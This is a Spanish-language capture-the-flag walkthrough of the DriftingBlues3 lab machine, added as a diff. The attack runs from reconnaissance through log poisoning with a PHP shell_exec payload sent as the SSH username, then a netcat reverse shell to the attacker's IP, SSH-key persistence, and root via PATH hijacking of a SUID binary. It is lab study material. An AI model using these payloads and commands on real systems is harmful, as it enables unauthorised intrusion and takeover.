@@ -1,0 +1,153 @@
+<p>En este reto nos encontramos escaneo , decodificacion de bas64 , log poisoning y  abuso del $PATH.</p>
+
+<p>No es un reto extremadamente dificil en el aprendemos como usar el path para escalar privilegios y comprobaremos lo delicado que es mostrar logs a traves de un usario.</p>
+
+<p><img src="assets/ez.png" alt="800x600" /></p>
+
+<h2 id="herramientas-y-recursos-web-utilizados">Herramientas y recursos web utilizados</h2>
+
+<ul>
+  <li>arp-scan</li>
+  <li>nmap</li>
+  <li>urlencoder</li>
+  <li>https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/</li>
+</ul>
+
+<h3 id="escaneo">Escaneo</h3>
+
+<p>Empezamos averiguando la ip de la maquina victima para ello ejecutamos la herramienta arp-scan nos fijamos en el resultado y buscamos la mac que empieza por 08:00 esa mac es de virtualbox.</p>
+
+<p>Ejecutamos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>arp-scan <span class="nt">--localnet</span>
+</code></pre></div></div>
+<p><img src="assets/driftingblues3/arp-scan.png" alt="800x600" /></p>
+
+<p>Una vez obtenida la ip pasamos al escanear puertos</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-A</span> <span class="nt">-n</span> <span class="nt">-p-</span> ipvictima
+</code></pre></div></div>
+<p><img src="assets/driftingblues3/nmap.png" alt="800x600" /></p>
+
+<p>Vemos que nos muestra el 22 y el 80 y en el 80 ya nos muestra una ruta /eventeadmins que debe de extraerla del fichero robots.txt todo esto lo puedes ver por firefox directamente.</p>
+
+<p><img src="assets/driftingblues3/eventadmins.png" alt="800x600" /></p>
+
+<p>Revisamos la pagina y del texto podemos ver dos nombre de posibles usuarios uno john y el otro es buddyG , tambien nos dice que cheqeemos /littlequeenofspades.html</p>
+
+<p><img src="assets/driftingblues3/littlequeen.png" alt="800x600" /></p>
+
+<p>Revisamos la pagina y a simple vista a mi no me dice nada , pero revisando su codigo encuentro un cifrado en base64  nos copiamos el churro y procedemos a decodificarlo.</p>
+
+<p>El resultado de la primera decodificacion nos da otro codigo base64 , decodificamos los dos y nos da una ruta.</p>
+
+<p><img src="assets/driftingblues3/base64-d.png" alt="800x600" /></p>
+
+<p>Vamos a la ruta que nos proporciono el codigo adminsfixit.php y vemos que es es el auth log ssh.</p>
+
+<p><img src="assets/driftingblues3/ssh-auth-log.png" alt="800x600" /></p>
+
+<h3 id="log-poisoning">Log poisoning</h3>
+
+<p>Si intentamos login con cualuier usuario vemos que aparece reflejado en el log al refrescar la pagina.</p>
+
+<p><img src="assets/driftingblues3/ssh-loco.png" alt="800x600" />
+<img src="assets/driftingblues3/log-loco.png" alt="800x600" /></p>
+
+<p>Ahora es el momento de intentar envenenar el log para nuestro beneficio subiendo una carga util que nos permita ejecutar codigo de manera remota “RCE”</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh &lt;?php <span class="nb">echo </span>shell_exec<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">'cmd'</span><span class="o">])</span><span class="p">;</span> ?&gt;@ipvictima
+</code></pre></div></div>
+
+<p><img src="assets/driftingblues3/cargautil.png" alt="690x225" /></p>
+
+<p>Si ha funcionado deberiamos de poder ejuctar codigo con la siguiente ruta:  http://$ipvictima/adminsfixit.php?cmd=ls
+Para que los resultados sean mas visibles podemos visualizar la pagina por su codigo fuente.</p>
+
+<p><img src="assets/driftingblues3/prompt-ls.png" alt="632x616" /></p>
+
+<p>Desde mi punto de vista ya conseguimos lo mas complicado , ahora lo mejor en mandarnos una reverse shell , para ello ejecutamos tanto en nuestro equipo como en la victima netcat.</p>
+
+<p>Primero ponemos a la escucha la maquina atacante con :</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lnvp</span> 80 
+</code></pre></div></div>
+<p>Y en la victima si fuera necesario podemos encodear la url  para ello vamos a urlencoder.org</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://<span class="nv">$ipvictima</span>/adminsfixit.php?cmd<span class="o">=</span>nc%20-e%20%2Fbin%2Fsh%20192.168.0.112%2080
+</code></pre></div></div>
+<p><img src="assets/driftingblues3/shell.png" alt="654x76" /></p>
+
+<p>Ya tenemos la shell en nuestra maquina ahora toca hacerla interactiva</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/sh")'</span>
+</code></pre></div></div>
+
+<h3 id="escalada-de-privilegios">Escalada de privilegios</h3>
+
+<p>Encontramos un usario en home robertj el cual tiene el fichero user.txt el cual no podemos leer por permisos pues aun somos el usario  www-data.</p>
+
+<p>Vamos a probar a crear las claves  ssh para poder conectarnos por ssh con ese usario antes deberiamos comprobar la config de sshd para ver si el usuario tiene el authorized keys activado si no esta olvidemos esta escalada.</p>
+
+<p>Podemos crearlas en cualquier lugar pero mejor nos posicionamos en el directio .ssh de su home asi no la movemos despues</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh-keygen <span class="nt">-f</span> robertj
+</code></pre></div></div>
+<p>Una vez creadas copiamos la clave publica a authorized_keys dentro de .ssh “obvio” y nos copiamos la privada a nuestra maquina atacante.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cp </span>clavepublica authorized_keys
+</code></pre></div></div>
+
+<p>Probamos a conectar por ssh</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-i</span> robertj robertj@192.168.0.102
+</code></pre></div></div>
+
+<p>Si lo hacemos tal y como se crearon las claves y copiamos a mi no me funciono hay que modificar los permisos y ponerlos solo de lectura para el propietario</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nb">chmod </span>400 robertj
+</code></pre></div></div>
+<p>Volvemos a ejecutar ahora nos pide la contraseña que dimos cuando crearmos las claves</p>
+
+<p><img src="assets/driftingblues3/robertj.png" alt="654x76" /></p>
+
+<p>Una vez dentro cat al user.txt para obtener la flag</p>
+
+<blockquote>
+  <p>413f<strong>**</strong><strong>**“</strong>*</p>
+</blockquote>
+
+<p>Una vez como el usuario comprobamos si hay algun binario que pueda ejecutar como root con sudo y tambien binarios con suid</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-l</span>
+find /  <span class="nt">-perm</span> /4000
+</code></pre></div></div>
+<p><img src="assets/driftingblues3/sudofind.png" alt="538x541" /></p>
+
+<p>El binario en cuestion es getinfo y nos vamos a aprovechar  y alterar el path.</p>
+
+<p>getinfo hace uso de cat , asi que nos creammos un fichero de nombre cat con el contenido /bin/bash y añadimos la ruta donde tengamos nuestro cat trucado a nuestro path</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> /bin/bash <span class="o">&gt;</span> <span class="nb">cat</span>
+</code></pre></div></div>
+
+<p>Le damos permisos de ejucion para todos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod </span>777 <span class="nb">cat</span>
+</code></pre></div></div>
+
+<p>Añadimos nuestra ruta al path</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export  </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span> 
+</code></pre></div></div>
+
+<p>En el comando anterior veis en directorio que he usado para crear el cat malicioso , comprobamos que nuestro directorio este en el PATH.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="nv">$PATH</span>
+</code></pre></div></div>
+<p><img src="assets/driftingblues3/path.png" alt="663x43" /></p>
+
+<p>Ahora estamos listos para ejecutar getinfo ni bien se ejecute deberia leer nuestro cat trucado y hacernos root al toque</p>
+
+<p><img src="assets/driftingblues3/root.png" alt="800x600" /></p>
+
+<p>Acordaros de la flag si os interesa , gracias por leer mis apuntes.</p>
